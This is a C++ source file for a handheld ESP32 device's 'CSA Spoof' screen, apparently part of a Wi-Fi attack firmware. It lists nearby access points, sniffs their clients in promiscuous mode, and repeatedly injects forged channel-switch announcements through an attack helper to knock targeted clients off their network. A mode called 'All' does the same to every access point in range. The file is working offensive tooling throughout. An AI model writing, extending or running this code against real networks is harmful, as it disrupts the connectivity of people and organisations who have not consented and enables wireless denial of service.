#include "WifiCsaSpoofScreen.h"
#include "core/Device.h"
#include "core/ScreenManager.h"
#include "utils/network/WifiAttackUtil.h"
#include "ui/actions/ShowStatusAction.h"

#include <WiFi.h>

// ── Static definitions ────────────────────────────────────────────────────
WifiCsaSpoofScreen::ApEntry WifiCsaSpoofScreen::_allTargets[MAX_ALL] = {};
int          WifiCsaSpoofScreen::_allCount = 0;
portMUX_TYPE WifiCsaSpoofScreen::_allLock  = portMUX_INITIALIZER_UNLOCKED;
WifiCsaSpoofScreen* WifiCsaSpoofScreen::_clientScanner = nullptr;
portMUX_TYPE WifiCsaSpoofScreen::_clientLock = portMUX_INITIALIZER_UNLOCKED;

WifiCsaSpoofScreen::~WifiCsaSpoofScreen()
{
  if (_clientScanner == this) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    _clientScanner = nullptr;
  }
  if (_attacker) { delete _attacker; _attacker = nullptr; }
}

// ── Contextual entry ──────────────────────────────────────────────────────
void WifiCsaSpoofScreen::configureFromChannel(uint8_t channel, const uint8_t* bssid,
                                              const uint8_t* client, const char* ssid)
{
  _mode = MODE_TARGET;
  _fromContext = true;
  _selectedClientCount = 0;
  _selectedClientMacStr[0] = '\0';

  if (bssid) {
    memcpy(_target.bssid, bssid, 6);
    _target.channel = (channel >= 1 && channel <= 13) ? (int)channel : 1;
    _target.ssid = (ssid && ssid[0]) ? String(ssid) : String("-");
  }
  _defaultToChannel();

  if (client) {
    memcpy(_selectedClients[0], client, 6);
    _selectedClientCount = 1;
    _refreshSelectedClientMacStr();
  }
}

// ── Lifecycle ─────────────────────────────────────────────────────────────
void WifiCsaSpoofScreen::onInit()
{
  if (_fromContext) {
    _startAttack();
    if (_state != STATE_RUNNING) { _fromContext = false; _showMain(); }
    return;
  }
  _showMain();
}

void WifiCsaSpoofScreen::onItemSelected(uint8_t index)
{
  if (_state == STATE_MAIN) {
    _mainSel = index;
    if (index == 0) {
      _mode = (_mode == MODE_TARGET) ? MODE_ALL : MODE_TARGET;
      _showMain();
    } else if (_mode == MODE_TARGET) {
      if (index == 1) _selectWifi();
      else if (index == 2) { _toChannel = (_toChannel % 13) + 1; _showMain(); }
      else if (index == 3) {
        if (_target.ssid == "-") ShowStatusAction::show("Access Point not set");
        else _scanClients();
      }
      else if (index == 4) _startAttack();
    } else {  // MODE_ALL
      if (index == 1) { _toChannel = (_toChannel % 13) + 1; _showMain(); }
      else if (index == 2) _startAttack();
    }
  } else if (_state == STATE_SELECT_WIFI) {
    if (index == 0) { _selectWifi(true); return; }
    const int scanIndex = (int)index - 1;
    if (scanIndex < 0 || scanIndex >= _scanCount) return;
    _target.ssid    = _scanLabels[scanIndex];
    _target.channel = _scanChannels[scanIndex];
    sscanf(_scanValues[scanIndex], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
           &_target.bssid[0], &_target.bssid[1], &_target.bssid[2],
           &_target.bssid[3], &_target.bssid[4], &_target.bssid[5]);
    _selectedClientCount = 0;
    _selectedClientMacStr[0] = '\0';
    _defaultToChannel();
    _showMain();
  } else if (_state == STATE_SELECT_CLIENTS) {
    if (index == 0) { _scanClients(); return; }
    if (index == 1) {
      _selectedClientCount = 0;
      _selectedClientMacStr[0] = '\0';
      _showClients(true);
      return;
    }
    const int n = (int)index - 2;
    if (n < 0 || n >= _seenClientCount) return;
    const uint8_t* mac = _seenClients[_clientOrder[n]].mac;

    int found = -1;
    for (uint8_t i = 0; i < _selectedClientCount; ++i) {
      if (memcmp(_selectedClients[i], mac, 6) == 0) { found = (int)i; break; }
    }
    if (found >= 0) {
      for (uint8_t i = (uint8_t)found; i + 1 < _selectedClientCount; ++i)
        memcpy(_selectedClients[i], _selectedClients[i + 1], 6);
      --_selectedClientCount;
    } else if (_selectedClientCount < MAX_SELECTED_CLIENTS) {
      memcpy(_selectedClients[_selectedClientCount++], mac, 6);
    } else {
      ShowStatusAction::show("Client limit: 4", 1000);
    }
    _refreshSelectedClientMacStr();
    _showClients(true);
  }
}

void WifiCsaSpoofScreen::onUpdate()
{
  if (_state != STATE_RUNNING) { ListScreen::onUpdate(); return; }

  if (Uni.Nav->wasPressed()) {
    const auto dir = Uni.Nav->readDirection();
    if (dir == INavigation::DIR_BACK || dir == INavigation::DIR_PRESS) { _stopAttack(); return; }
  }

  const String toCh = String(" > CH") + String(_toChannel);
  _statusTitle = "CSA Spoof";

  if (_mode == MODE_ALL) {
    _csaAll();
    _statusDetail = (_allCount == 0) ? String("Scanning...")
                                     : (String(_allCount) + " APs" + toCh);
  } else if (_selectedClientCount == 0) {
    if (_attacker) {
      _attacker->channelSwitch(_target.bssid, _target.ssid.c_str(), _target.channel, _toChannel);
      _statusDetail = _target.ssid + toCh;
    }
  } else if (_attacker) {
    for (uint8_t i = 0; i < _selectedClientCount; ++i)
      _attacker->channelSwitchUnicast(_selectedClients[i], _target.bssid, _target.channel, _toChannel);
    _statusDetail = (_selectedClientCount == 1 ? String(_selectedClientMacStr)
                                               : String(_selectedClientCount) + " clients") + toCh;
  }

  render();
  delay(100);
}

void WifiCsaSpoofScreen::onBack()
{
  if (_state == STATE_SELECT_WIFI || _state == STATE_SELECT_CLIENTS) _showMain();
  else if (_state == STATE_RUNNING)                                  _stopAttack();
  else                                                               Screen.goBack();
}

void WifiCsaSpoofScreen::onRender()
{
  if (_state == STATE_RUNNING) { _drawStatus(_statusTitle.c_str(), _statusDetail.c_str()); return; }
  ListScreen::onRender();
}

// ── Menu ──────────────────────────────────────────────────────────────────
void WifiCsaSpoofScreen::_showMain()
{
  _state = STATE_MAIN;
  _modeSub = (_mode == MODE_TARGET) ? "Target" : "All";
  _toChannelSub = String("CH ") + String(_toChannel);
  _mainItems[0] = {"Mode", _modeSub.c_str()};

  uint8_t itemCount;
  if (_mode == MODE_TARGET) {
    _targetSub = _target.ssid;
    _mainItems[1] = {"Access Point", _targetSub.c_str()};
    _mainItems[2] = {"To Channel", _toChannelSub.c_str()};
    _clientsSub = _selectedClientCount ? "Custom" : "All";
    _mainItems[3] = {"Clients", _clientsSub.c_str()};
    _mainItems[4] = {"Start"};
    itemCount = 5;
  } else {
    _mainItems[1] = {"To Channel", _toChannelSub.c_str()};
    _mainItems[2] = {"Start"};
    itemCount = 3;
  }

  if (_mainSel >= itemCount) _mainSel = 0;
  setItems(_mainItems, itemCount, _mainSel);
}

void WifiCsaSpoofScreen::_defaultToChannel()
{
  _toChannel = (_target.channel <= 6) ? 11 : 1;
}

void WifiCsaSpoofScreen::_showScanResults()
{
  _state = STATE_SELECT_WIFI;
  _scanItems[0] = {"Rescan"};
  for (int i = 0; i < _scanCount; i++) {
    _scanItems[i + 1] = {_scanLabels[i], _scanDisplay[i]};
    _scanItems[i + 1].rssi            = _scanRssi[i];
    _scanItems[i + 1].hasRssi         = true;
    _scanItems[i + 1].sublabelMarquee = true;
  }
  setItems(_scanItems, _scanCount + 1);
}

void WifiCsaSpoofScreen::_selectWifi(bool forceScan)
{
  if (_scanValid && !forceScan) { _showScanResults(); return; }

  _state = STATE_SELECT_WIFI;
  render();
  ShowStatusAction::show("Scanning...", 0);

  WiFi.mode(WIFI_STA);
  WiFi.scanDelete();
  const int total = WiFi.scanNetworks();
  _scanCount = total > MAX_SCAN ? MAX_SCAN : (total > 0 ? total : 0);
  for (int i = 0; i < _scanCount; i++) {
    snprintf(_scanLabels[i], sizeof(_scanLabels[i]), "%s", WiFi.SSID(i).c_str());
    _scanChannels[i] = (uint8_t)WiFi.channel(i);
    snprintf(_scanValues[i], sizeof(_scanValues[i]), "%s", WiFi.BSSIDstr(i).c_str());
    snprintf(_scanDisplay[i], sizeof(_scanDisplay[i]), "%s CH%u", _scanValues[i], (unsigned)_scanChannels[i]);
    _scanRssi[i] = (int16_t)WiFi.RSSI(i);
  }
  WiFi.scanDelete();
  _scanValid = true;

  if (_scanCount == 0) ShowStatusAction::show("No networks found");
  _showScanResults();
}

// ── Client selection (same pattern as Deauth/Disassoc) ──────────────────────
bool WifiCsaSpoofScreen::_clientSelected(const uint8_t* mac) const {
  for (uint8_t i = 0; i < _selectedClientCount; ++i)
    if (memcmp(_selectedClients[i], mac, 6) == 0) return true;
  return false;
}

void WifiCsaSpoofScreen::_refreshSelectedClientMacStr()
{
  if (_selectedClientCount == 1) {
    const uint8_t* m = _selectedClients[0];
    snprintf(_selectedClientMacStr, sizeof(_selectedClientMacStr),
             "%02X:%02X:%02X:%02X:%02X:%02X", m[0], m[1], m[2], m[3], m[4], m[5]);
  } else {
    _selectedClientMacStr[0] = '\0';
  }
}

void WifiCsaSpoofScreen::_clientCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  auto* self = _clientScanner;
  if (!self || !buf || type != WIFI_PKT_DATA) return;
  const auto* pkt = static_cast<const wifi_promiscuous_pkt_t*>(buf);
  if (pkt->rx_ctrl.sig_len < 24) return;
  const uint8_t* f = pkt->payload;
  if ((f[0] & 0x0c) != 0x08) return;
  const bool toDs = (f[1] & 1) != 0;
  const bool fromDs = (f[1] & 2) != 0;
  if (toDs == fromDs) return;
  const uint8_t* ap = toDs ? f + 4 : f + 10;
  const uint8_t* station = toDs ? f + 10 : f + 4;
  if (memcmp(ap, self->_target.bssid, 6) != 0 || (station[0] & 1)) return;
  portENTER_CRITICAL(&self->_clientLock);
  for (uint8_t i = 0; i < self->_seenClientCount; ++i) {
    if (memcmp(self->_seenClients[i].mac, station, 6) == 0) {
      self->_seenClients[i].rssi = pkt->rx_ctrl.rssi;
      portEXIT_CRITICAL(&self->_clientLock);
      return;
    }
  }
  if (self->_seenClientCount < MAX_SEEN_CLIENTS) {
    auto& entry = self->_seenClients[self->_seenClientCount++];
    memcpy(entry.mac, station, 6);
    entry.rssi = pkt->rx_ctrl.rssi;
    snprintf(entry.macStr, sizeof(entry.macStr),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             station[0], station[1], station[2], station[3], station[4], station[5]);
  }
  portEXIT_CRITICAL(&self->_clientLock);
}

void WifiCsaSpoofScreen::_scanClients() {
  _state = STATE_SELECT_CLIENTS;
  ShowStatusAction::show("Scanning...", 0);
  _seenClientCount = _selectedClientCount;
  memset(_seenClients, 0, sizeof(_seenClients));
  for (uint8_t i = 0; i < _selectedClientCount; ++i) {
    memcpy(_seenClients[i].mac, _selectedClients[i], 6);
    snprintf(_seenClients[i].macStr, sizeof(_seenClients[i].macStr),
             "%02X:%02X:%02X:%02X:%02X:%02X",
             _selectedClients[i][0], _selectedClients[i][1], _selectedClients[i][2],
             _selectedClients[i][3], _selectedClients[i][4], _selectedClients[i][5]);
  }
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  esp_wifi_set_promiscuous(false);
  _clientScanner = this;
  esp_wifi_set_promiscuous_rx_cb(&_clientCb);
  esp_wifi_set_channel(_target.channel, WIFI_SECOND_CHAN_NONE);
  esp_wifi_set_promiscuous(true);
  for (uint8_t pass = 0; pass < 2; ++pass) {
    for (uint8_t interval = 0; interval < 13; ++interval) delay(500);
  }
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  _clientScanner = nullptr;
  delay(10);
  esp_wifi_set_promiscuous(false);
  WiFi.mode(WIFI_OFF);
  _showClients();
}

void WifiCsaSpoofScreen::_showClients(bool preserveSelection) {
  _state = STATE_SELECT_CLIENTS;
  _clientItems[0] = {"Rescan"};
  snprintf(_clientLabels[1], sizeof(_clientLabels[1]), "[%c] All", _selectedClientCount ? ' ' : 'x');
  _clientItems[1] = {_clientLabels[1]};

  for (uint8_t i = 0; i < _seenClientCount; ++i) _clientOrder[i] = i;
  for (uint8_t i = 1; i < _seenClientCount; ++i) {
    uint8_t key = _clientOrder[i], j = i;
    while (j > 0 && _seenClients[_clientOrder[j - 1]].rssi < _seenClients[key].rssi) {
      _clientOrder[j] = _clientOrder[j - 1];
      --j;
    }
    _clientOrder[j] = key;
  }

  for (uint8_t i = 0; i < _seenClientCount; ++i) {
    const auto& entry = _seenClients[_clientOrder[i]];
    snprintf(_clientLabels[i + 2], sizeof(_clientLabels[i + 2]),
             "[%c] %s", _clientSelected(entry.mac) ? 'x' : ' ', entry.macStr);
    _clientItems[i + 2] = {_clientLabels[i + 2]};
    _clientItems[i + 2].rssi = entry.rssi;
    _clientItems[i + 2].hasRssi = true;
  }
  if (preserveSelection) { setCount(_seenClientCount + 2); render(); }
  else setItems(_clientItems, _seenClientCount + 2);
}

// ── Start / Stop ──────────────────────────────────────────────────────────
void WifiCsaSpoofScreen::_startAttack()
{
  if (_mode == MODE_TARGET) {
    const MacAddr blank = {0, 0, 0, 0, 0, 0};
    if (_target.ssid == "-" && memcmp(_target.bssid, blank, 6) == 0) {
      ShowStatusAction::show("Access Point not set");
      return;
    }
  }

  _state       = STATE_RUNNING;
  _chromeDrawn = false;
  _statusTitle  = "CSA Spoof";
  _statusDetail = (_mode == MODE_ALL) ? String("Scanning...")
                                      : (_target.ssid + " > CH" + String(_toChannel));
  render();   // paint before the blocking radio init in the ctor

  _attacker = new WifiAttackUtil();

  if (_mode == MODE_ALL) {
    portENTER_CRITICAL(&_allLock);
    memset(_allTargets, 0, sizeof(_allTargets));
    _allCount = 0;
    portEXIT_CRITICAL(&_allLock);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(&WifiCsaSpoofScreen::_beaconCb);
  }
  render();
}

void WifiCsaSpoofScreen::_stopAttack()
{
  if (_mode == MODE_ALL) {
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
  }
  if (_attacker) { delete _attacker; _attacker = nullptr; }
  _allChanHop = 0;
  _allCount   = 0;
  ShowStatusAction::show("Stopped", 1000);

  if (_fromContext) { _fromContext = false; Screen.goBack(); }
  else              _showMain();
}

void WifiCsaSpoofScreen::_csaAll()
{
  if (!_attacker) return;

  ApEntry local[MAX_ALL];
  int count;
  portENTER_CRITICAL(&_allLock);
  memcpy(local, _allTargets, sizeof(_allTargets));
  count = _allCount;
  portEXIT_CRITICAL(&_allLock);

  // Broadcast CSA beacon per AP (changes channel per AP internally).
  for (int i = 0; i < count; i++) {
    if (!local[i].valid) continue;
    _attacker->channelSwitch(local[i].bssid, "", local[i].channel, _toChannel);
  }

  // Hop to next scan channel after injecting so _beaconCb keeps discovering.
  _allChanHop = (_allChanHop % 13) + 1;
  _attacker->setChannel(_allChanHop);
}

// ── Beacon callback (All mode AP discovery) ─────────────────────────────────
void WifiCsaSpoofScreen::_beaconCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
  if (type != WIFI_PKT_MGMT || buf == nullptr) return;
  const auto     pkt = static_cast<wifi_promiscuous_pkt_t*>(buf);
  const uint8_t* pay = pkt->payload;
  const size_t   len = pkt->rx_ctrl.sig_len;
  if (len < 10) return;
  const uint8_t fc_sub = (pay[0] >> 4) & 0x0F;
  if (fc_sub != 8) return;  // beacon only
  if (len < 22) return;
  const uint8_t* bssid = pay + 16;
  const uint8_t  ch    = pkt->rx_ctrl.channel;

  portENTER_CRITICAL(&_allLock);
  for (int i = 0; i < _allCount; i++) {
    if (memcmp(_allTargets[i].bssid, bssid, 6) == 0) {
      _allTargets[i].channel = ch;
      portEXIT_CRITICAL(&_allLock);
      return;
    }
  }
  if (_allCount < MAX_ALL) {
    memcpy(_allTargets[_allCount].bssid, bssid, 6);
    _allTargets[_allCount].channel = ch;
    _allTargets[_allCount].valid   = true;
    _allCount++;
  }
  portEXIT_CRITICAL(&_allLock);
}

// ── Running view ────────────────────────────────────────────────────────────
void WifiCsaSpoofScreen::_drawStatus(const char* titleLine, const char* detailLine)
{
  auto& lcd = Uni.Lcd;
  if (!_chromeDrawn) {
    lcd.fillRect(bodyX(), bodyY(), bodyW(), bodyH(), TFT_BLACK);
    _chromeDrawn = true;
  }

  const int lineH  = lcd.fontHeight();
  const int labelH = lineH * 2 + 6;
  const int cy     = bodyY() + bodyH() / 2;

  Sprite sp(&Uni.Lcd);
  if (!sp.createSprite(bodyW(), labelH)) return;
  sp.fillSprite(TFT_BLACK);
  sp.setTextSize(1);
  sp.setTextDatum(MC_DATUM);

  const int maxTextW = bodyW() - 8;
  auto fit = [&](String t) -> String {
    if (sp.textWidth(t.c_str()) <= maxTextW) return t;
    while (t.length() > 1 && sp.textWidth((t + "...").c_str()) > maxTextW) t.remove(t.length() - 1);
    return t + "...";
  };

  sp.setTextColor(TFT_DARKGREY, TFT_BLACK);
  sp.drawString(fit(String(titleLine)).c_str(), bodyW() / 2, lineH / 2 + 1);
  sp.setTextColor(TFT_WHITE, TFT_BLACK);
  sp.drawString(fit(String(detailLine)).c_str(), bodyW() / 2, lineH + lineH / 2 + 5);

  sp.pushSprite(bodyX(), cy - labelH / 2);
  sp.deleteSprite();
}
